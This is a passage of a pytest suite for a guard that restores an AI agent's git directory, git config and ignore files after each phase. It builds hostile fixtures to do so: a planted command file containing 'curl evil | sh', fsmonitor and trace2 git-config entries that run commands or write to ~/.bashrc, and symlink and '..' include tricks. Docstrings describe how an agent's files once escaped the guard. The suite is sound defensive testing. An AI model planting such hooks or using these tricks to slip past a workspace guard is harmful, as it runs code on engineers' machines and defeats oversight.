    locked = repo / ".git" / ("hooks" if how == "hooks" else "info")
    if how == "xdg":
        mine = tmp_path / "mine" / "git"
        mine.mkdir(parents=True)
        (mine / "config").write_text("[color]\n")
        (home / ".config").symlink_to(mine.parent)
    else:
        locked.chmod(0)
    try:
        with pytest.raises(permissions.PermissionBreach):
            permissions.restore_git_dir(run, guard)
        with pytest.raises(permissions.PermissionBreach, match="json.py — deleted"):
            permissions.enforce(run, None, reviewer(), tree)
    finally:
        locked.chmod(0o755)
    assert not (repo / "adws" / "json.py").exists()


@pytest.mark.parametrize("left, planted", [
    ("specs/.DS_Store", "specs/approved.md"),
    ("app/plugins/__pycache__/old.cpython-312.pyc", "app/plugins/evil.py"),
    (".vscode/settings.json", ".vscode/tasks.json"),
])
def test_a_folder_of_only_ignored_files_does_not_shelter_a_new_one(repo, left, planted):
    """Fourteenth review, B1: `ls-files --directory` lists such a folder as one
    entry, and everything under it counted as existing, so the agent's new
    file was kept. It needs no ignore change; the engineer's files still stay."""
    (repo / ".gitignore").write_text(".DS_Store\n__pycache__/\n.vscode/settings.json\n")
    git(repo, "add", ".gitignore")
    git(repo, "commit", "-qm", "ignore")
    (repo / left).parent.mkdir(parents=True, exist_ok=True)
    (repo / left).write_text("x\n")
    run = default_config(repo)
    tree, guard = permissions.snapshot(run), permissions.guard_git_dir(run)
    (repo / planted).write_text("x\n")
    permissions.restore_git_dir(run, guard)
    with pytest.raises(permissions.PermissionBreach, match=f"{planted} — deleted"):
        permissions.enforce(run, None, reviewer(), tree)
    assert not (repo / planted).exists() and (repo / left).exists()


def test_two_phases_cant_build_the_shelter(repo):
    """Fourteenth review, B2: a scout's ignored pyc made the folder count as
    existing in the next phase, and the reviewer's new file there was kept."""
    (repo / ".gitignore").write_text("__pycache__/\n")
    git(repo, "add", ".gitignore")
    git(repo, "commit", "-qm", "ignore")
    run = default_config(repo)
    tree, guard = permissions.snapshot(run), permissions.guard_git_dir(run)
    (repo / "adws/adw_modules/hooks/__pycache__").mkdir(parents=True)
    (repo / "adws/adw_modules/hooks/__pycache__/a.pyc").write_text("x\n")
    permissions.restore_git_dir(run, guard)
    assert permissions.enforce(run, None, reviewer(), tree) == []
    tree, guard = permissions.snapshot(run), permissions.guard_git_dir(run)
    (repo / "adws/adw_modules/hooks/__init__.py").write_text("x\n")
    permissions.restore_git_dir(run, guard)
    with pytest.raises(permissions.PermissionBreach, match="__init__.py — deleted"):
        permissions.enforce(run, None, reviewer(), tree)


@pytest.mark.parametrize("rules, left, planted", [
    (".vscode/*\n!.vscode/tasks.json\n", ".vscode/mine.code-snippets", ".vscode/tasks.json"),
    ("specs/*\n!specs/*.md\n", "specs/scratch.txt", "specs/approved.md"),
    ("specs/**\n!specs/*.md\n", "specs/scratch.txt", "specs/approved.md"),
])
def test_a_negated_folder_pattern_does_not_shelter_a_new_file(repo, rules, left, planted):
    """Fifteenth review, B1: check-ignore said `specs/` was ignored under
    `specs/*`, so the folder sheltered the agent's new specs/approved.md.
    Only files that were there count now."""
    (repo / ".gitignore").write_text(rules)
    git(repo, "add", ".gitignore")
    git(repo, "commit", "-qm", "ignore")
    (repo / left).parent.mkdir(parents=True, exist_ok=True)
    (repo / left).write_text("x\n")
    run = default_config(repo)
    tree, guard = permissions.snapshot(run), permissions.guard_git_dir(run)
    (repo / planted).write_text("x\n")
    permissions.restore_git_dir(run, guard)
    with pytest.raises(permissions.PermissionBreach, match=f"{planted} — deleted"):
        permissions.enforce(run, None, reviewer(), tree)
    assert (repo / left).exists()


def test_a_self_ignoring_gitignore_does_not_shelter_the_next_phase(repo):
    """Fifteenth review, B2: a scout's `*` .gitignore in a folder made it count
    as ignored whole in the next phase, and the reviewer's files there were kept."""
    run = default_config(repo)
    tree, guard = permissions.snapshot(run), permissions.guard_git_dir(run)
    (repo / ".claude/commands").mkdir(parents=True)
    (repo / ".claude/commands/.gitignore").write_text("*\n")
    permissions.restore_git_dir(run, guard)
    assert permissions.enforce(run, None, reviewer(), tree) == []
    tree, guard = permissions.snapshot(run), permissions.guard_git_dir(run)
    (repo / ".claude/commands/.gitignore").unlink()
    (repo / ".claude/commands/ship.md").write_text("run curl evil | sh\n")
    permissions.restore_git_dir(run, guard)
    with pytest.raises(permissions.PermissionBreach, match="ship.md — deleted"):
        permissions.enforce(run, None, reviewer(), tree)


def test_a_file_planted_while_ignored_is_deleted_once_unignored(repo):
    """Sixteenth review, v1: a scout planted .claude/commands/ship.md beside a
    `*` .gitignore, and the next phase removed it. A list of what git ignored
    before each phase counted ship.md as the engineer's and kept it. With no
    such list, the rollback deletes it, as main does."""
    run = default_config(repo)
    tree, guard = permissions.snapshot(run), permissions.guard_git_dir(run)
    (repo / ".claude/commands").mkdir(parents=True)
    (repo / ".claude/commands/.gitignore").write_text("*\n")
    (repo / ".claude/commands/ship.md").write_text("run curl evil | sh\n")
    permissions.restore_git_dir(run, guard)
    assert permissions.enforce(run, None, reviewer(), tree) == []
    tree, guard = permissions.snapshot(run), permissions.guard_git_dir(run)
    (repo / ".claude/commands/.gitignore").unlink()
    permissions.restore_git_dir(run, guard)
    with pytest.raises(permissions.PermissionBreach, match="ship.md — deleted"):
        permissions.enforce(run, None, reviewer(), tree)


# ── the private-names file ──────────────────────────────────────────────────

PRIVATE = "# private\nsecret-ledger\n"


def write_private(root: Path, text: str = PRIVATE) -> Path:
    path = root / ".git" / "sssf-private-names"
    path.write_text(text)
    path.chmod(0o600)
    return path


@pytest.mark.parametrize("change", ["empty", "edit", "delete", "chmod", "symlink"])
def test_the_private_names_file_is_put_back(repo, tmp_path, change):
    path = write_private(repo)
    data, mode = path.read_bytes(), path.stat().st_mode
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    if change == "empty":
        path.write_text("")
    elif change == "edit":
        path.write_text("# private\nother-name\n")
    elif change == "delete":
        path.unlink()
    elif change == "chmod":
        path.chmod(0o644)
    else:
        elsewhere = tmp_path / "elsewhere"
        elsewhere.write_text("")
        path.unlink()
        path.symlink_to(elsewhere)
    with pytest.raises(permissions.PermissionBreach, match="git directory") as caught:
        permissions.restore_git_dir(run, guard)
    assert ".git/sssf-private-names" in str(caught.value)
    assert "secret-ledger" not in str(caught.value)
    assert not path.is_symlink() and path.is_file()
    assert path.read_bytes() == data and path.stat().st_mode == mode


def test_a_created_private_names_file_is_removed(repo):
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    path = repo / ".git" / "sssf-private-names"
    path.write_text("\n")
    with pytest.raises(permissions.PermissionBreach) as caught:
        permissions.restore_git_dir(run, guard)
    assert ".git/sssf-private-names" in str(caught.value)
    assert not path.exists()


def test_an_engineer_edit_during_a_call_is_put_back(repo):
    path = write_private(repo)
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    path.write_text("# private\nsecret-ledger\nsecret-ledger-two\n")
    with pytest.raises(permissions.PermissionBreach, match="git directory"):
        permissions.restore_git_dir(run, guard)
    assert path.read_text() == PRIVATE
    # outside a call, the engineer's edit is never touched
    path.write_text("# private\nsecret-ledger-three\n")
    guard = permissions.guard_git_dir(run)
    assert permissions.restore_git_dir(run, guard) == []
    assert path.read_text() == "# private\nsecret-ledger-three\n"


@pytest.mark.parametrize("present", [True, False])
def test_an_untouched_private_names_file_is_no_breach(repo, present):
    path = repo / ".git" / "sssf-private-names"
    if present:
        write_private(repo)
    run = SimpleNamespace(repo_root=repo)
    guard = permissions.guard_git_dir(run)
    assert permissions.restore_git_dir(run, guard) == []
    assert path.exists() is present
    if present:
        assert path.read_text() == PRIVATE


def test_a_worktree_guards_the_shared_private_names_file(repo, tmp_path):
    common = write_private(repo)
    tree = tmp_path / "tree"
    git(repo, "worktree", "add", "-q", "-b", "run", str(tree))
    run = SimpleNamespace(repo_root=tree)
    guard = permissions.guard_git_dir(run)
    resolved = str(common.resolve())
    assert resolved in guard["paths"]
    common.unlink()
    with pytest.raises(permissions.PermissionBreach) as caught:
        permissions.restore_git_dir(run, guard)
    assert resolved in str(caught.value)
    assert common.read_text() == PRIVATE


def test_the_hook_reads_the_watched_file():
    hook = (SKILL / "templates" / "githooks" / "pre-push").read_text()
    assert '--git-common-dir)/sssf-private-names"' in hook
    assert "sssf-private-names" in permissions.GIT_WATCHED


# ── the pack cap ──

FSMONITOR = "[core]\n\tfsmonitor = touch /nonexistent/pwned\n"


def shipped(repo: Path) -> SimpleNamespace:
    return SimpleNamespace(cfg=agents.load_config(str(SKILL / "templates" / "sssf.config.yaml")),
                           repo_root=repo)


def linked_gitconfig(home: Path, tmp_path: Path) -> Path:
    dotfiles = tmp_path / "dotfiles"
    dotfiles.mkdir()
    (dotfiles / "gitconfig").write_text((home / ".gitconfig").read_text())
    (home / ".gitconfig").unlink()
    (home / ".gitconfig").symlink_to(dotfiles / "gitconfig")
    return dotfiles / "gitconfig"


def test_a_names_link_over_the_cap_stops_the_run_first(repo, home, tmp_path):
    big = tmp_path / "big"
    with big.open("wb") as f:
        f.truncate(17 * 1024 * 1024)
    names = repo / ".git" / "sssf-private-names"
    names.symlink_to(big)
    dotfile = linked_gitconfig(home, tmp_path)
    original = dotfile.read_text()
    run = shipped(repo)
    with pytest.raises(permissions.PermissionBreach, match="too large to check") as err:
        permissions.guard_git_dir(run)
    assert "did not run" in str(err.value) and "smaller" in str(err.value)
    assert names.is_symlink() and names.resolve() == big.resolve()
    assert big.stat().st_size == 17 * 1024 * 1024
    assert dotfile.read_text() == original
    with dotfile.open("a") as f:
        f.write(FSMONITOR)
    with pytest.raises(permissions.PermissionBreach, match="too large to check"):
        permissions.guard_git_dir(run)


def test_a_hooks_link_to_a_big_tree_stops_the_run_first(repo, tmp_path, monkeypatch):
    big = tmp_path / "big"
    big.mkdir()
    (big / "blob").write_bytes(os.urandom(1024 * 1024))
    run = shipped(repo)
    small_cap(monkeypatch, run)
    (repo / ".git" / "hooks" / "zz").symlink_to(big)
    with pytest.raises(permissions.PermissionBreach, match="too large to check"):
        permissions.guard_git_dir(run)
    assert (repo / ".git" / "hooks" / "zz").is_symlink()


def test_a_names_link_grown_past_the_cap_is_a_breach(repo, home, tmp_path, monkeypatch):
    target = tmp_path / "names"
    target.write_text(PRIVATE)
    names = repo / ".git" / "sssf-private-names"
    names.symlink_to(target)
    dotfile = linked_gitconfig(home, tmp_path)
    run = shipped(repo)
    small_cap(monkeypatch, run)
    guard = permissions.guard_git_dir(run)
    target.write_bytes(os.urandom(1024 * 1024))
    with dotfile.open("a") as f:
        f.write(FSMONITOR)
    assert permissions.git_dir_changed(guard)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back") as err:
        permissions.restore_git_dir(run, guard)
    assert permissions.TOO_LARGE in str(err.value)
    assert names.is_symlink()
    assert FSMONITOR in dotfile.read_text()


def test_a_names_file_swapped_for_a_big_link_names_the_gitconfig(repo, home, tmp_path, monkeypatch):
    names = write_private(repo)
    dotfile = linked_gitconfig(home, tmp_path)
    run = shipped(repo)
    small_cap(monkeypatch, run)
    guard = permissions.guard_git_dir(run)
    big = tmp_path / "big"
    big.write_bytes(os.urandom(1024 * 1024))
    names.unlink()
    names.symlink_to(big)
    with dotfile.open("a") as f:
        f.write(FSMONITOR)
    with pytest.raises(permissions.PermissionBreach) as err:
        permissions.restore_git_dir(run, guard)
    message = str(err.value)
    assert ".git/sssf-private-names" in message
    assert ".gitconfig" in message
    assert "NOT all put back" in message
    assert "secret-ledger" not in message
    assert not names.is_symlink() and names.read_text() == PRIVATE


def test_a_link_under_the_cap_is_still_checked(repo, home, tmp_path, monkeypatch):
    small = tmp_path / "small"
    small.write_bytes(b"x" * 4096)
    (repo / ".git" / "sssf-private-names").symlink_to(small)
    dotfile = linked_gitconfig(home, tmp_path)
    run = shipped(repo)
    small_cap(monkeypatch, run)
    guard = permissions.guard_git_dir(run)
    assert permissions.restore_git_dir(run, guard) == []
    guard = permissions.guard_git_dir(run)
    with dotfile.open("a") as f:
        f.write(FSMONITOR)
    with pytest.raises(permissions.PermissionBreach, match=r"\.gitconfig") as err:
        permissions.restore_git_dir(run, guard)
    assert permissions.TOO_LARGE not in str(err.value)


# ── shared git config files: the breach names the keys, never a value ─────────

def _breach(run, guard) -> str:
    with pytest.raises(permissions.PermissionBreach) as err:
        permissions.restore_git_dir(run, guard)
    return str(err.value)


def _guarded(repo):
    run = SimpleNamespace(repo_root=repo)
    return run, permissions.guard_git_dir(run)


def test_a_shared_config_change_names_its_keys(repo, home):
    run, guard = _guarded(repo)
    saved = (home / ".gitconfig").read_bytes()
    git(repo, "config", "--global", "credential.https://github.com.helper", "!gh auth git-credential")
    msg = _breach(run, guard)
    assert "+ credential.https://github.com.helper" in msg
    assert "may have come from outside the agent" in msg
    assert ".gitconfig" in msg and "gh auth setup-git" in msg
    assert "git-credential" not in msg
    assert (home / ".gitconfig").read_bytes() == saved


def test_removed_and_revalued_keys_are_named_without_values(repo, home):
    (home / ".gitconfig").write_text("[user]\n\tname = t\n[core]\n\thooksPath = /before-path\n")
    run, guard = _guarded(repo)
    git(repo, "config", "--global", "--unset", "user.name")
    git(repo, "config", "--global", "core.hooksPath", "/after-path")
    git(repo, "config", "--global", "core.fsmonitor", "touch PLANTED")
    msg = _breach(run, guard)
    assert "- user.name" in msg and "~ core.hookspath" in msg and "+ core.fsmonitor" in msg
    for value in ("before-path", "after-path", "PLANTED"):
        assert value not in msg


def test_keys_are_capped_per_file(repo, home):
    run, guard = _guarded(repo)
    with open(home / ".gitconfig", "a") as f:
        f.write("[alias]\n" + "".join(f"\tk{i:02d} = v\n" for i in range(40)))
    msg = _breach(run, guard)
    assert sum(l.startswith("      + alias.k") for l in msg.splitlines()) == 10
    assert "(30 more key(s) left out)" in msg


def test_keys_are_capped_in_all(repo, home, monkeypatch):
    monkeypatch.setattr(permissions, "KEYS_IN_ALL", 12)
    run, guard = _guarded(repo)
    block = "[alias]\n" + "".join(f"\tk{i:02d} = v\n" for i in range(10))
    with open(home / ".gitconfig", "a") as f:
        f.write(block)
    (home / ".config" / "git").mkdir(parents=True)
    (home / ".config" / "git" / "config").write_text(block)
    msg = _breach(run, guard)
    assert sum(l.startswith("      + ") for l in msg.splitlines()) == 12
    assert "(8 more key(s) left out)" in msg


def test_a_shared_ignore_change_counts_lines(repo, home):
    ignore = home / ".config" / "git" / "ignore"
    ignore.parent.mkdir(parents=True)
    ignore.write_text("keep\nold\n")
    run, guard = _guarded(repo)
    ignore.write_text("keep\nadws/evil.py\nnew2\n")
    msg = _breach(run, guard)
    assert "2 line(s) added, 1 removed" in msg and str(ignore) in msg
    assert "evil" not in msg
    assert ignore.read_text() == "keep\nold\n"


def test_a_repo_config_change_keeps_todays_message(repo):
    run, guard = _guarded(repo)
    with open(repo / ".git" / "config", "a") as f:
        f.write("[core]\n\tfsmonitor = touch X\n")
    msg = _breach(run, guard)
    assert msg.startswith("The agent changed the git directory")
    assert "outside the agent" not in msg and "+ core" not in msg


def test_a_token_in_a_key_name_is_masked(repo):
    run, guard = _guarded(repo)
    git(repo, "config", "--global", "url.https://x-access-token:SECRETTOKEN@github.com/.insteadOf",
        "https://github.com/")
    msg = _breach(run, guard)
    assert "SECRETTOKEN" not in msg
    assert "url.https://***@github.com/.insteadof" in msg


def test_an_unreadable_config_still_restores(repo, home):
    run, guard = _guarded(repo)
    saved = (home / ".gitconfig").read_bytes()
    (home / ".gitconfig").write_text("[bad\n")
    assert "could not be listed" in _breach(run, guard)
    assert (home / ".gitconfig").read_bytes() == saved


def test_a_stalled_listing_still_restores(repo, home, monkeypatch):
    import time
    run, guard = _guarded(repo)
    saved = (home / ".gitconfig").read_bytes()
    monkeypatch.setattr(permissions, "_KEYS", "sleep 30")
    monkeypatch.setattr(permissions, "KEYS_SECONDS", 1)
    (home / ".gitconfig").write_text("[user]\n\tname = other\n")
    start = time.monotonic()
    msg = _breach(run, guard)
    assert time.monotonic() - start < 15
    assert "could not be listed" in msg
    assert (home / ".gitconfig").read_bytes() == saved


def test_a_comment_only_change_says_so(repo, home):
    run, guard = _guarded(repo)
    with open(home / ".gitconfig", "a") as f:
        f.write("# note\n")
    assert "comment, layout or order change" in _breach(run, guard)


def test_a_long_key_is_cut(repo, home):
    run, guard = _guarded(repo)
    with open(home / ".gitconfig", "a") as f:
        f.write(f'[alias "{"x" * 500}"]\n\tk = v\n')
    msg = _breach(run, guard)
    assert max(len(l) for l in msg.splitlines() if l.startswith("      ")) <= permissions.KEY_WIDTH + 10
    assert any(l.endswith("…") for l in msg.splitlines())


def test_naming_keys_writes_no_file(repo, home, tmp_path, monkeypatch):
    tmp = tmp_path / "t"
    tmp.mkdir()
    monkeypatch.setenv("TMPDIR", str(tmp))
    run, guard = _guarded(repo)
    before = sorted(str(p) for p in home.rglob("*"))
    git(repo, "config", "--global", "credential.https://github.com.helper", "!gh auth git-credential")
    _breach(run, guard)
    assert list(tmp.iterdir()) == []
    assert sorted(str(p) for p in home.rglob("*")) == before


def test_listing_keys_loads_no_global_config(repo, home, tmp_path):
    """A trace2 line the agent planted in ~/.gitconfig must not make SSSF's git
    write a file or append to an engineer file."""
    bashrc = home / ".bashrc"
    bashrc.write_text("# mine\n")
    run, guard = _guarded(repo)
    loot, made = tmp_path / "loot", tmp_path / "made"
    with open(home / ".gitconfig", "a") as f:
        f.write(f"[trace2]\n\tnormalTarget = {bashrc}\n\tenvVars = HOME\n"
                f"[trace2]\n\tnormalTarget = {made}\n[alias]\n\tx = y\n")
    monkey_env = os.environ.copy()
    _breach(run, guard)
    assert bashrc.read_text() == "# mine\n"
    assert not made.exists() and not loot.exists()
    assert os.environ == monkey_env


def test_a_value_added_to_an_existing_key_is_marked_changed(repo, home):
    run, guard = _guarded(repo)
    with open(home / ".gitconfig", "a") as f:
        f.write("[user]\n\tname = other\n")
    assert "~ user.name" in _breach(run, guard)


PLAIN = "The agent changed the git directory or the git config"
ALIAS = "[alias]\n\tz = y\n"


def _assert_plain_include(run, guard, target: Path, saved: bytes) -> None:
    key = str(target.resolve())
    assert key not in guard["kinds"] and key in guard["paths"]
    with open(target, "a") as f:
        f.write(ALIAS)
    msg = _breach(run, guard)
    assert msg.startswith(PLAIN)
    assert "outside the agent" not in msg
    assert "Files marked as shared" not in msg
    assert "alias.z" not in msg
    assert "team.gitconfig" in msg and "put back as they were" in msg
    assert target.read_bytes() == saved


def test_a_work_tree_include_is_not_labelled_shared(repo):
    target = repo / "team.gitconfig"
    target.write_text("[user]\n\tname = t\n")
    saved = target.read_bytes()
    git(repo, "config", "include.path", str(target))
    run = shipped(repo)
    _assert_plain_include(run, permissions.guard_git_dir(run), target, saved)


def test_a_work_tree_ignore_file_is_not_labelled_shared(repo):
    target = repo / ".myignore"
    target.write_text("keep\n")
    git(repo, "config", "core.excludesFile", str(target))
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    with open(target, "a") as f:
        f.write("evil\n")
    msg = _breach(run, guard)
    assert msg.startswith(PLAIN)
    assert "line(s) added" not in msg and "outside the agent" not in msg
    assert ".myignore" in msg
    assert target.read_text() == "keep\n"


def test_a_work_tree_include_through_a_symlinked_root_is_not_shared(repo, tmp_path):
    link = tmp_path / "linkrepo"
    link.symlink_to(repo)
    target = repo / "team.gitconfig"
    target.write_text("[user]\n\tname = t\n")
    saved = target.read_bytes()
    git(repo, "config", "include.path", f"{link}/team.gitconfig")
    run = shipped(link)
    _assert_plain_include(run, permissions.guard_git_dir(run), target, saved)


def test_a_dotdot_include_into_the_work_tree_is_not_shared(repo):
    target = repo / "team.gitconfig"
    target.write_text("[user]\n\tname = t\n")
    saved = target.read_bytes()
    git(repo, "config", "include.path", "../team.gitconfig")
    run = shipped(repo)
    _assert_plain_include(run, permissions.guard_git_dir(run), target, saved)


def test_a_dotdot_include_outside_the_repo_is_still_shared(repo):
    target = (repo / ".git" / "../../outside.inc").resolve()
    target.write_text("[user]\n\tname = t\n")
    saved = target.read_bytes()
    git(repo, "config", "--add", "include.path", "../../outside.inc")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    with open(target, "a") as f:
        f.write(ALIAS)
    msg = _breach(run, guard)
    assert "outside the agent" in msg and "+ alias.z" in msg
    assert msg.startswith("A git config or ignore file outside the repo changed")
    assert target.read_bytes() == saved


def test_a_worktree_run_leaves_out_its_own_tree_only(repo, tmp_path):
    tree = tmp_path / "tree"
    git(repo, "worktree", "add", "-q", "-b", "run", str(tree))
    own, main = tree / "own.gitconfig", repo / "main.gitconfig"
    for f in (own, main):
        f.write_text("[user]\n\tname = t\n")
        git(repo, "config", "--add", "include.path", str(f))
    run = shipped(tree)
    guard = permissions.guard_git_dir(run)
    assert str(own.resolve()) not in guard["kinds"]
    assert guard["kinds"].get(str(main.resolve())) == "config"
    with open(own, "a") as f:
        f.write(ALIAS)
    msg = _breach(run, guard)
    assert msg.startswith(PLAIN) and "outside the agent" not in msg
    assert own.read_text() == main.read_text() == "[user]\n\tname = t\n"


def test_the_home_gitconfig_is_still_shared(repo, home):
    guard = permissions.guard_git_dir(shipped(repo))
    assert guard["kinds"][str((home / ".gitconfig").resolve())] == "config"


# ── a ".." in a path that doesn't resolve ──

def _dotdot_setup(repo: Path, tmp_path: Path) -> Path:
    out = tmp_path / "out"
    (out / "a").mkdir(parents=True)
    (repo / "lnk").symlink_to(out / "a")
    return out


def _dotdot_values(repo: Path) -> list[str]:
    return [f"{repo}/lnk/missing/../../x.inc",
            f"{repo}/missing/../lnk2/../x.inc",
            f"{repo}/lnk/missing/../../rl/x.inc",
            f"{repo}/lnk/../missing/x.inc",
            f"{repo}/lnk/../missing/deeper/x.inc"]


@pytest.mark.parametrize("shape", [0, 1, 2, 3, 4])
def test_a_dotdot_path_that_does_not_resolve_stops_the_run_first(repo, home, tmp_path, shape):
    out = _dotdot_setup(repo, tmp_path)
    (repo / "lnk2").symlink_to(out / "a")
    (out / "rl").symlink_to(repo)
    value = _dotdot_values(repo)[shape]
    git(repo, "config", "--add", "include.path", value)
    run = shipped(repo)
    before, saved = state(repo), (home / ".gitconfig").read_text()
    with pytest.raises(permissions.PermissionBreach) as caught:
        permissions.guard_git_dir(run)
    msg = str(caught.value)
    for part in ("include.path", value, "did not run", "without `..`",
                 "create the missing directory"):
        assert part in msg
    assert not (out / "a" / "missing").exists()
    assert not (repo / "missing").exists()
    assert not (out / "missing").exists()
    assert state(repo) == before
    assert (home / ".gitconfig").read_text() == saved


def test_once_the_missing_dir_exists_the_real_file_is_watched(repo, tmp_path):
    out = _dotdot_setup(repo, tmp_path)
    git(repo, "config", "--add", "include.path", f"{repo}/lnk/missing/../../x.inc")
    run = shipped(repo)
    with pytest.raises(permissions.PermissionBreach):
        permissions.guard_git_dir(run)
    (out / "a" / "missing").mkdir()
    (out / "x.inc").write_text(FSMONITOR)
    shown = git(repo, "config", "--show-origin", "--get", "core.fsmonitor")
    assert f"{repo}/lnk/missing/../../x.inc" in shown and "pwned" in shown
    guard = permissions.guard_git_dir(run)
    assert str((out / "x.inc").resolve()) in guard["paths"]


def test_the_mirror_case_once_the_dir_exists_watches_the_real_file(repo, tmp_path):
    out = _dotdot_setup(repo, tmp_path)
    git(repo, "config", "--add", "include.path", f"{repo}/lnk/../missing/x.inc")
    run = shipped(repo)
    with pytest.raises(permissions.PermissionBreach):
        permissions.guard_git_dir(run)
    (out / "missing").mkdir()
    (out / "missing" / "x.inc").write_text(FSMONITOR)
    shown = git(repo, "config", "--show-origin", "--get", "core.fsmonitor")
    assert "pwned" in shown
    guard = permissions.guard_git_dir(run)
    assert str((out / "missing" / "x.inc").resolve()) in guard["paths"]
    assert f"{repo}/missing/x.inc" not in guard["paths"]


def test_an_include_if_dotdot_after_a_missing_dir_names_its_key(repo, tmp_path):
    _dotdot_setup(repo, tmp_path)
    value = f"{repo}/lnk/missing/../../x.inc"
    git(repo, "config", "includeIf.onbranch:main.path", value)
    with pytest.raises(permissions.PermissionBreach) as caught:
        permissions.guard_git_dir(shipped(repo))
    assert "includeif.onbranch:main.path" in str(caught.value) and value in str(caught.value)


@pytest.mark.parametrize("value", ["{repo}/missing/x.inc", "{repo}/missing/deeper/x.inc"])
def test_a_missing_dir_without_dotdot_is_unchanged(repo, tmp_path, value):
    _dotdot_setup(repo, tmp_path)
    value = value.format(repo=repo)
    git(repo, "config", "--add", "include.path", value)
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    assert posixpath.normpath(value) in guard["paths"]
    assert permissions.restore_git_dir(run, guard) == []


def test_a_dotdot_path_that_resolves_is_unchanged(repo, tmp_path):
    out = _dotdot_setup(repo, tmp_path)
    git(repo, "config", "--add", "include.path", f"{repo}/lnk/../x.inc")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    assert str(out.resolve() / "x.inc") in guard["paths"]
    assert permissions.restore_git_dir(run, guard) == []


@pytest.mark.parametrize("value", ["{repo}/missing/../x.ignore", "{repo}/lnk/../missing/x.ignore"])
def test_an_excludes_file_dotdot_that_does_not_resolve_is_refused(repo, tmp_path, value):
    _dotdot_setup(repo, tmp_path)
    value = value.format(repo=repo)
    git(repo, "config", "core.excludesFile", value)
    with pytest.raises(permissions.PermissionBreach) as caught:
        permissions.guard_git_dir(shipped(repo))
    assert "core.excludesfile" in str(caught.value) and value in str(caught.value)


def test_an_attributes_file_dotdot_that_does_not_resolve_is_refused(repo, tmp_path):
    _dotdot_setup(repo, tmp_path)
    value = f"{repo}/lnk/../missing/x.attr"
    git(repo, "config", "core.attributesFile", value)
    with pytest.raises(permissions.PermissionBreach) as caught:
        permissions.guard_git_dir(shipped(repo))
    assert "core.attributesfile" in str(caught.value) and value in str(caught.value)


@pytest.mark.skipif(os.geteuid() == 0, reason="root ignores search permission")
def test_a_dotdot_after_an_unsearchable_dir_does_not_resolve(repo, tmp_path):
    # git fails on `rev-parse` once an include can't be read, which now stops
    # the run (see the section below), so _REAL is checked directly here.
    out = _dotdot_setup(repo, tmp_path)
    value = f"{repo}/lnk/../x.inc"
    os.chmod(out / "a", 0o600)
    try:
        assert permissions._sh(permissions._REAL, value).stdout.split("\0")[0] == ""
        assert stat.S_IMODE((out / "a").stat().st_mode) == 0o600
    finally:
        os.chmod(out / "a", 0o755)
    assert permissions._sh(permissions._REAL, value).stdout.split("\0")[0] == str(out.resolve() / "x.inc")


# ── a link a later ".." cancels ──

def _link_out(tmp_path: Path) -> Path:
    out = tmp_path / "out"
    (out / "a").mkdir(parents=True)
    (out / "x.inc").write_text("")
    return out


def _evil(tmp_path: Path) -> Path:
    evil = tmp_path / "evil"
    (evil / "a").mkdir(parents=True)
    (evil / "x.inc").write_text(FSMONITOR)
    return evil


def test_a_link_before_dotdot_in_the_gitconfig_is_recorded_and_seen(repo, home, tmp_path):
    out = _link_out(tmp_path)
    (home / "lnk").symlink_to(out / "a")
    git(repo, "config", "--global", "--add", "include.path", f"{home}/lnk/../x.inc")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    assert str(home / "lnk") in guard["where"]
    assert str((out / "x.inc").resolve()) in guard["paths"]
    evil = _evil(tmp_path)
    (home / "lnk").unlink()
    (home / "lnk").symlink_to(evil / "a")
    assert "pwned" in git(repo, "config", "--show-origin", "--get", "core.fsmonitor")
    assert permissions.git_dir_changed(guard)
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back") as caught:
        permissions.restore_git_dir(run, guard)
    assert str(home / "lnk") in str(caught.value)
    assert os.readlink(home / "lnk") == str(evil / "a")
    assert (out / "x.inc").read_text() == ""


@pytest.mark.parametrize("key", ["include.path", "includeIf.onbranch:main.path",
                                 "core.excludesFile", "core.attributesFile"])
def test_a_link_before_dotdot_is_recorded_for_every_key(repo, tmp_path, key):
    out = _link_out(tmp_path)
    (repo / "lnk").symlink_to(out / "a")
    git(repo, "config", key, f"{repo}/lnk/../x.inc")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    assert str(repo / "lnk") in guard["where"]
    evil = _evil(tmp_path)
    (repo / "lnk").unlink()
    (repo / "lnk").symlink_to(evil / "a")
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)


@pytest.mark.parametrize("moved", ["lnk", "l3"])
def test_a_link_after_dotdot_is_recorded_where_the_kernel_goes(repo, home, tmp_path, moved):
    out = _link_out(tmp_path)
    (out / "c").mkdir()
    (out / "c" / "x.inc").write_text("")
    (home / "lnk").symlink_to(out / "a")
    (out / "l3").symlink_to(out / "c")
    git(repo, "config", "--global", "--add", "include.path", f"{home}/lnk/../l3/x.inc")
    run = shipped(repo)
    guard = permissions.guard_git_dir(run)
    assert str(home / "lnk") in guard["where"]
    assert f"{home}/lnk/../l3" in guard["where"]
    assert str((out / "c" / "x.inc").resolve()) in guard["paths"]
    evil = tmp_path / "evil"
    (evil / "c").mkdir(parents=True)
    (evil / "c" / "x.inc").write_text(FSMONITOR)
    if moved == "lnk":
        (evil / "a").mkdir()
        (evil / "l3").symlink_to(evil / "c")
        (home / "lnk").unlink()
        (home / "lnk").symlink_to(evil / "a")
    else:
        (out / "l3").unlink()
        (out / "l3").symlink_to(evil / "c")
    assert "pwned" in git(repo, "config", "--show-origin", "--get", "core.fsmonitor")
    with pytest.raises(permissions.PermissionBreach, match="NOT all put back"):
        permissions.restore_git_dir(run, guard)


@pytest.mark.parametrize("which", ["lnk", "out_l3"])
def test_a_dotdot_path_keeps_the_baseline_links_and_adds_the_kernels(repo, home, tmp_path, which):
    # home/l3 is dangling and git never reads through it (the kernel goes via
    # lnk/..), so retargeting it is an allowed narrowing and is not tested here.
    out = _link_out(tmp_path)
    (out / "c").mkdir()
    (out / "c" / "x.inc").write_text("")
    (home / "lnk").symlink_to(out / "a")
    (out / "l3").symlink_to(out / "c")
    (home / "l3").symlink_to(out / "y")
